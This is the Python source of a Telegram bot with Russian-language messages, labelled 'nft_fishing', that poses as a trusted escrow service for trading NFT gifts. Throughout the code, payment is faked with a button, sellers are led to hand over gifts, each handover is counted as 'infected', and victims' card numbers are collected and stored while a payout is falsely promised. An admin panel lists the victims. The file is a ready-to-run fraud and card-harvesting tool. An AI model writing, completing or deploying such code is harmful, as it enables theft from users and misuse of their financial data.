#bot_nft_fishing
import logging
import sqlite3
import re
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

ADMIN_ID = None #замените на ваш админ_id

def init_db():
    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            card_number TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS deals (
            deal_id TEXT PRIMARY KEY,
            seller_id INTEGER,
            seller_username TEXT,
            buyer_id INTEGER,
            buyer_username TEXT,
            gift_link TEXT,
            price REAL,
            status TEXT DEFAULT 'created',
            infected INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS user_states (
            user_id INTEGER PRIMARY KEY,
            waiting_for_card BOOLEAN DEFAULT 0,
            waiting_for_card_payment TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    conn.commit()
    conn.close()

def set_user_state(user_id, waiting_for_card=False, payment_info=None):
    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()

    if payment_info:
        payment_info_str = f"{payment_info['deal_id']}|{payment_info['price']}"
    else:
        payment_info_str = None

    cursor.execute('''
        INSERT OR REPLACE INTO user_states 
        (user_id, waiting_for_card, waiting_for_card_payment) 
        VALUES (?, ?, ?)
    ''', (user_id, waiting_for_card, payment_info_str))

    conn.commit()
    conn.close()

def get_user_state(user_id):
    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()

    cursor.execute('''
        SELECT waiting_for_card, waiting_for_card_payment 
        FROM user_states WHERE user_id = ?
    ''', (user_id,))

    result = cursor.fetchone()
    conn.close()

    if result:
        waiting_for_card, payment_info_str = result
        if payment_info_str:
            deal_id, price = payment_info_str.split('|')
            payment_info = {'deal_id': deal_id, 'price': float(price)}
        else:
            payment_info = None

        return waiting_for_card, payment_info
    return False, None

def clear_user_state(user_id):
    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()

    cursor.execute('DELETE FROM user_states WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def main_menu(update: Update, context: CallbackContext):
    keyboard = [
        [KeyboardButton("🔹 Создать сделку")],
        [KeyboardButton("🔹 Поддержка")],
        [KeyboardButton("🔹 Инструкция")],
        [KeyboardButton("🔹 Отзывы")],
        [KeyboardButton("🔹 Бонусы")]
    ]

    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    if update.callback_query:
        update.callback_query.message.reply_text(
            "🤖 Я Бот-гарант для безопасной продажи/покупки NFT подарков. Сейчас на оплату/выплату действует скидка -10%/+10%. Выберите действие: ",
            reply_markup=reply_markup)
    else:
        update.message.reply_text("🔽 Выберите действие:",
                                  reply_markup=reply_markup)

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
        (user_id, username)
    )
    conn.commit()
    conn.close()

    welcome_text = (
        "🤖 *Я Бот-гарант*\n\n"
        "🔸 *Безопасная продажа/покупка NFT подарков*\n\n"
        "🔸 *Особенности:*\n"
        "• Гарантированные безопасные сделки\n"
        "• Защита от мошенников\n"
        "• Частые акции и бонусы\n"
        "• Быстрые выплаты\n\n"
    )

    if context.args and context.args[0].startswith('deal_'):
        handle_start_with_deal(update, context)
    else:
        update.message.reply_text(welcome_text, parse_mode='Markdown')
        main_menu(update, context)

def admin_panel_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_ID:
        update.message.reply_text("🪬 Нет доступа")
        return

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()

    cursor.execute('''
        SELECT deal_id, seller_username, buyer_username, gift_link, price, status, infected, created_at 
        FROM deals 
        ORDER BY created_at DESC
    ''')
    deals = cursor.fetchall()

    cursor.execute("SELECT SUM(infected) FROM deals")
    total_infected = cursor.fetchone()[0] or 0

    cursor.execute("SELECT COUNT(*) FROM deals")
    total_deals = cursor.fetchone()[0]

    conn.close()

    if not deals:
        update.message.reply_text(" Админ панель\n\nСделок нет")
        return

    deals_text = " Админ панель\n\n"
    deals_text += f" Всего сделок: {total_deals}\n"
    deals_text += f" Отправок: {total_infected}\n\n"
    deals_text += " Сделки:\n\n"

    for deal in deals:
        (deal_id, seller_username, buyer_username, gift_link, price, status,
         infected, created_at) = deal

        deals_text += f"🕷️ {deal_id}\n"
        deals_text += f"    @{seller_username or 'N/A'}\n"
        deals_text += f"    @{buyer_username or 'N/A'}\n"
        deals_text += f"    {gift_link or 'Нет'}\n"
        deals_text += f"    {price or 'Нет'}\n"
        deals_text += f"    {status}\n"
        deals_text += f"    {infected}\n"
        deals_text += f"    {created_at}\n\n"

    update.message.reply_text(deals_text)

def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text
    username = update.effective_user.username or "N/A"

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
        (user_id, username)
    )
    conn.commit()
    conn.close()

    if text == "🔹 Создать сделку":
        create_deal_message(update, context)
    elif text == "🔹 Поддержка":
        support_message(update, context)
    elif text == "🔹 Инструкция":
        how_it_works_message(update, context)
    elif text == "🔹 Отзывы":
        reviews_message(update, context)
    elif text == "🔹 Бонусы":
        bonuses_message(update, context)
    else:
        waiting_for_card, payment_info = get_user_state(user_id)

        if waiting_for_card:
            handle_card_input(update, context, payment_info)
            return

        handle_deal_states(update, context)

def create_deal_message(update: Update, context: CallbackContext):
    deal_id = f"deal_{datetime.now().strftime('%Y%m%d%H%M%S')}"
    seller_id = update.effective_user.id
    seller_username = update.effective_user.username or "N/A"

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO deals (deal_id, seller_id, seller_username, status) VALUES (?, ?, ?, ?)",
        (deal_id, seller_id, seller_username, 'created')
    )
    conn.commit()
    conn.close()

    bot_username = context.bot.username
    deal_link = f"https://t.me/{bot_username}?start={deal_id}"

    update.message.reply_text(
        f"🕸️ Сделка создана!\n\n"
        f"🔸 Ссылка для покупателя:\n<a href='{deal_link}'>Нажмите чтобы присоединиться к сделке</a>\n\n"
        f"Отправьте эту ссылку покупателю",
        parse_mode='HTML'
    )

def support_message(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔸 Техподдержка\n\n"
        "По вопросам обращайтесь:\n\n"
        "⏺︎  @xxx_xxx_bot"
    )

def how_it_works_message(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔸 *Как работает*\n\n"
        "⏺︎  *Для продавца:*\n"
        "1. •  Создайте сделку\n"
        "2. •  Поделитесь ссылкой\n"
        "3. •  Укажите подарок и цену\n"
        "4. •  Отправьте подарок\n"
        "5. •  Получите оплату\n"
        "⏺︎  *Для покупателя:*\n"
        "1. •  Перейдите по ссылке, чтобы вступить в сделку\n"
        "2. •  Дождитесь информацию о подарке\n"
        "3. •  Оплатите товар\n"
        "4. •  Получите подарок от продавца"
    )

def reviews_message(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔸 Отзывы:\n\n"
        "📊 Посмотреть отзывы можно в: @xxx_xxx_bot\n\n"
    )

def bonuses_message(update: Update, context: CallbackContext):
    update.message.reply_text(
        "🔥 *Акция для новых пользователей!*\n\n"
        "🔸 *В течение 3 сделок действуют специальные условия:*\n"
        "• 🏷️ На оплату: скидка -10%\n"
        "• 💸 На выплату: бонус +10%\n\n"
        "❗ *Условия:*\n"
        "• Акция действует для первых 3 сделок\n"
        "• Сумма сделки не должна превышать 9000₽\n"
        "• Скидки применяются автоматически\n"
        "• Без скрытых комиссий\n\n"
        "⚡️ *Успейте воспользоваться выгодными условиями!*",
        parse_mode='Markdown'
    )

def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    query.answer()

    data = query.data

    if data == "pay_gift":
        pay_gift(query, context)
    elif data == "send_gift":
        send_gift(query, context)
    elif data == "gift_received":
        gift_received(query, context)
    elif data == "gift_not_received":
        gift_not_received(query, context)

def handle_start_with_deal(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(
        "INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
        (user_id, username)
    )

    if context.args and context.args[0].startswith('deal_'):
        deal_id = context.args[0]

        cursor.execute("SELECT seller_id, seller_username, status FROM deals WHERE deal_id = ?", (deal_id,))
        result = cursor.fetchone()

        if result:
            seller_id, seller_username, status = result

            if status == 'created':
                cursor.execute(
                    "UPDATE deals SET buyer_id = ?, buyer_username = ?, status = 'waiting_gift_info' WHERE deal_id = ?",
                    (user_id, username, deal_id)
                )
                conn.commit()

                context.bot.send_message(
                    seller_id,
                    f"👤 Покупатель присоединился!\n\n"
                    f"🕷️ @{username}\n\n"
                    f"⬇️ Введите ссылку на подарок:"
                )

                update.message.reply_text(
                    f"🔸 Вы в сделке с @{seller_username or 'продавцом'}! "
                    f"Ждите информацию о подарке"
                )
            else:
                update.message.reply_text("✔️ Сделка уже активна")
        else:
            update.message.reply_text("❌ Сделка не найдена")
    else:
        main_menu(update, context)

    conn.close()

def handle_deal_states(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    text = update.message.text

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()

    cursor.execute("SELECT deal_id, status FROM deals WHERE seller_id = ? AND status = 'waiting_gift_info'", (user_id,))
    seller_deal = cursor.fetchone()

    if seller_deal:
        deal_id, status = seller_deal

        cursor.execute(
            "UPDATE deals SET gift_link = ?, status = 'waiting_price' WHERE deal_id = ?",
            (text, deal_id)
        )
        conn.commit()

        update.message.reply_text(
            "✅ Ссылка сохранена!\n\n"
            "▶️ Теперь введите цену подарка в рублях:\n"
            "Пример: 2500"
        )
        conn.close()
        return

    cursor.execute("SELECT deal_id, gift_link, buyer_id FROM deals WHERE seller_id = ? AND status = 'waiting_price'", (user_id,))
    price_deal = cursor.fetchone()

    if price_deal:
        deal_id, gift_link, buyer_id = price_deal

        try:
            price = float(text)

            cursor.execute(
                "UPDATE deals SET price = ?, status = 'waiting_payment' WHERE deal_id = ?",
                (price, deal_id)
            )
            conn.commit()
            conn.close()

            if buyer_id:
                keyboard = [[InlineKeyboardButton("✅ Оплатить", callback_data="pay_gift")]]
                reply_markup = InlineKeyboardMarkup(keyboard)

                discounted_price = price * 0.9

                context.bot.send_message(
                    buyer_id,
                    f"🔸 Детали покупки:\n\n"
                    f"▪️ Ссылка на подарок: {gift_link}\n"
                    f"▪️ Исходная цена: {price} руб.\n"
                    f"▪️ Сумма к оплате: {discounted_price:.2f} руб. (скидка 10%)\n\n"
                    f"▪️Нажмите кнопку для оплаты:",
                    reply_markup=reply_markup
                )

                update.message.reply_text("🕸️ Цена сохранена! Покупатель уведомлен")
            else:
                update.message.reply_text("🕸️ Покупатель не найден")

        except ValueError:
            update.message.reply_text("🕸️ Неверная цена. Введите число:\nПример: 2500")
            conn.close()
        return

    main_menu(update, context)
    conn.close()

def pay_gift(query, context):
    user_id = query.from_user.id

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT deal_id, seller_id, price, gift_link FROM deals WHERE buyer_id = ? AND status = 'waiting_payment'",
        (user_id,))
    result = cursor.fetchone()

    if not result:
        query.edit_message_text("❌ Ошибка: активная сделка не найдена")
        conn.close()
        return

    deal_id, seller_id, price, gift_link = result

    cursor.execute("UPDATE deals SET status = 'paid' WHERE deal_id = ?", (deal_id,))
    conn.commit()
    conn.close()

    keyboard = [[InlineKeyboardButton("🔰 Отправил подарок", callback_data="send_gift")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    context.bot.send_message(
        seller_id,
        f"✅ Товар оплачен!\n\n"
        f"🪙 Сумма оплаты: {price} руб.\n"
        f"▶️ Ссылка на подарок: {gift_link}\n\n"
        f"Отправьте подарок и подтвердите:",
        reply_markup=reply_markup
    )

    query.edit_message_text("✅ Оплачено! Ждите подарок")

def send_gift(query, context):
    seller_id = query.from_user.id

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT deal_id, buyer_id, price, gift_link FROM deals WHERE seller_id = ? AND status = 'paid'",
                   (seller_id,))
    result = cursor.fetchone()

    if not result:
        query.edit_message_text("❌ Нет активных сделок для подтверждения отправки")
        conn.close()
        return

    deal_id, buyer_id, price, gift_link = result

    cursor.execute(
        "UPDATE deals SET status = 'gift_sent', infected = infected + 1 WHERE deal_id = ?",
        (deal_id,)
    )
    conn.commit()
    conn.close()

    keyboard = [
        [InlineKeyboardButton("✔️ Получил", callback_data="gift_received")],
        [InlineKeyboardButton("✖️ Не получил", callback_data="gift_not_received")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    seller_username = query.from_user.username or "продавца"

    context.bot.send_message(
        buyer_id,
        f"👤 @{seller_username} отправил подарок\n\n"
        f"▶️ Ссылка: {gift_link}\n"
        f"💰 Сумма: {price} руб.\n\n"
        f"Вы получили подарок?",
        reply_markup=reply_markup
    )

    query.edit_message_text("✅ Отправка подтверждена! Ждите подтверждения получения")

def gift_received(query, context):
    user_id = query.from_user.id

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT deal_id, seller_id, price FROM deals WHERE buyer_id = ? AND status = 'gift_sent'",
                   (user_id,))
    result = cursor.fetchone()

    if not result:
        query.edit_message_text("❌ Ошибка: сделка не найдена")
        conn.close()
        return

    deal_id, seller_id, price = result

    cursor.execute("UPDATE deals SET status = 'completed' WHERE deal_id = ?", (deal_id,))
    conn.commit()
    conn.close()

    bonus_price = price * 1.1

    set_user_state(seller_id, waiting_for_card=True, payment_info={'deal_id': deal_id, 'price': bonus_price})

    context.bot.send_message(
        seller_id,
        f"✅ Подарок получен!\n\n"
        f"💵 Сумма к выплате: {bonus_price:.2f} руб. (бонус +10%)\n\n"
        f"💳 Отправьте номер карты для получения средств:"
    )

    query.edit_message_text("🌙 Сделка завершена! Спасибо")

def gift_not_received(query, context):
    user_id = query.from_user.id

    conn = sqlite3.connect('bot.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT deal_id, seller_id FROM deals WHERE buyer_id = ? AND status = 'gift_sent'", (user_id,))
    result = cursor.fetchone()

    if not result:
        query.edit_message_text("❌️ Ошибка: сделка не найдена")
        conn.close()
        return

    deal_id, seller_id = result
    conn.close()

    context.bot.send_message(
        seller_id,
        "❌ Покупатель сообщил, что не получил подарок. Обратитесь в поддержку"
    )

    query.edit_message_text("✔️ Проблема зафиксирована. Обратитесь в поддержку")

def handle_card_input(update: Update, context: CallbackContext, payment_info):
    text = update.message.text
    user_id = update.effective_user.id

    card_clean = re.sub(r'[^\d]', '', text)
    if len(card_clean) == 16 and card_clean.isdigit():
        if payment_info:
            deal_id = payment_info['deal_id']
            price = payment_info['price']

            formatted_card = f"{card_clean[:4]} {card_clean[4:8]} {card_clean[8:12]} {card_clean[12:]}"

            update.message.reply_text(
                f"✅ Карта сохранена!\n\n"
                f"💵 Сумма: {price:.2f} руб. (с учетом бонуса +10%)\n"
                f"💳 На карту: {formatted_card}\n\n"
                f"☑️ Средства поступят в течение 5 минут - 1 часа"
            )

            clear_user_state(user_id)

            conn = sqlite3.connect('bot.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET card_number = ? WHERE user_id = ?",
                (card_clean, user_id)
            )
            conn.commit()
            conn.close()

            main_menu(update, context)
        else:
            conn = sqlite3.connect('bot.db', check_same_thread=False)
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET card_number = ? WHERE user_id = ?",
                (card_clean, user_id)
            )
            conn.commit()
            conn.close()

            formatted_card = f"{card_clean[:4]} {card_clean[4:8]} {card_clean[8:12]} {card_clean[12:]}"
            update.message.reply_text(f"✅ Карта привязана: {formatted_card}")

            main_menu(update, context)

    else:
        update.message.reply_text(
            "❌ Неверный номер карты\n"
            "Пример: 1234 5678 9012 3456"
        )

def main():
    if os.path.exists('bot.db'):
        os.remove('bot.db')
        print("🕸️ База удалена")

    init_db()

    TOKEN = "Замените на токен вашего бота"

    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("admpanel", admin_panel_command))

    dp.add_handler(CallbackQueryHandler(button_handler))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    print("🕷️ Бот запущен!")
    print("🌙 Админ: /admpanel")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
